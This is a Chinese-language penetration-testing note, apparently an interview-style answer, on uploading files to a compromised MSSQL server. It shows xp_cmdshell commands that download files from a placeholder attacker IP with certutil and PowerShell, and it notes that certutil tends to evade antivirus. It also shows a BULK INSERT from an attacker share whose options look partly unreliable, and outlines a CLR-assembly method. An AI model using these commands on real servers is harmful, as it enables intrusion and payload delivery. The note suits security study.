### 如果想通过 MMSQL 上传文件需要开启哪个存储过程的权限

**1. 利用 `xp_cmdshell` 存储过程（最常见）**

如前面所述，`xp_cmdshell` 是执行系统命令的利器。一旦你获得了执行 `xp_cmdshell` 的权限（通常是 `sysadmin`），就可以通过它来执行命令行下的文件上传操作

- **所需权限**：`sysadmin` 服务器角色或 `CONTROL SERVER` 权限，并且 `xp_cmdshell` 必须已启用

- **实现方法**：

  - **方法一：利用 `certutil` 下载文件** 这是最常见且非常实用的方法，它利用 Windows 自带的 `certutil.exe` 工具来下载文件

    ```sql
    EXEC xp_cmdshell 'certutil.exe -urlcache -split -f "http://<攻击机IP>/<文件名>" "c:\\<文件保存路径>\\<文件名>"';
    ```

    这种方法的好处是，`certutil` 是 Windows 系统自带的，不容易被杀毒软件拦截

  - **方法二：利用 PowerShell 下载文件** 使用 PowerShell 的 `Invoke-WebRequest` 或 `Net.WebClient` 方法来下载文件

    ```sql
    EXEC xp_cmdshell 'powershell.exe -c "Invoke-WebRequest -Uri http://<攻击机IP>/<文件名> -OutFile c:\\<文件保存路径>\\<文件名>"';
    ```

    或者使用更简单的别名：

    ```sql
    EXEC xp_cmdshell 'powershell.exe -c "iwr http://<攻击机IP>/<文件名> -OutFile c:\\<文件保存路径>\\<文件名>"';
    ```

  - **方法三：利用其他命令行工具** 如果目标机器上安装了 `wget`、`curl` 等工具，你也可以使用它们

**2. 利用数据库的 `OPENROWSET` 或 `BULK INSERT`**

这种方法相对不那么常见，但如果 `xp_cmdshell` 被禁用，这是一种可以尝试的备选方案。它主要利用 MSSQL 强大的文件处理能力

- **所需权限**：

  - `sysadmin` 或 `bulkadmin` 角色
  - `BULK INSERT` 需要对目标文件夹有写权限，并且 `OPENROWSET` 必须启用 `Ad Hoc Distributed Queries`

- **实现方法**：

  - **方法一：`OPENROWSET`** 这种方法可以从一个共享网络路径（UNC Path）读取数据，并插入到数据库表中。虽然它主要用于数据导入，但你可以利用它将文件内容导入到数据库，再通过其他方式导出

  - **方法二：`BULK INSERT`** 和 `OPENROWSET` 类似，`BULK INSERT` 也能从网络共享路径读取文件数据

    ```sql
    BULK INSERT MyTable
    FROM '\\<攻击机IP>\share\<文件名>'
    WITH (
      ROWTERMINATOR = 'EOF',
      DATA_SOURCE = 'MyDataSource'
    );
    ```

    这种方法需要 MSSQL 服务的运行用户对网络共享路径有读取权限

**3. 利用 SQL CLR 集成**

这是一种高级且隐蔽的上传文件方法。如果你能够执行 SQL CLR 代码，你就可以编写一个 .NET 存储过程，该存储过程包含文件读写功能

- **所需权限**：`sysadmin` 或 `EXTERNAL ACCESS ASSEMBLY` 权限
- **实现方法**：
  1. 用 C# 编写一个可以从 URL 下载文件并保存到本地的 DLL
  2. 将 DLL 文件上传到服务器，或者通过 `xp_cmdshell` 下载
  3. 使用 SQL 命令将 DLL 注册为 SQL CLR 程序集
  4. 执行你编写的存储过程，实现文件上传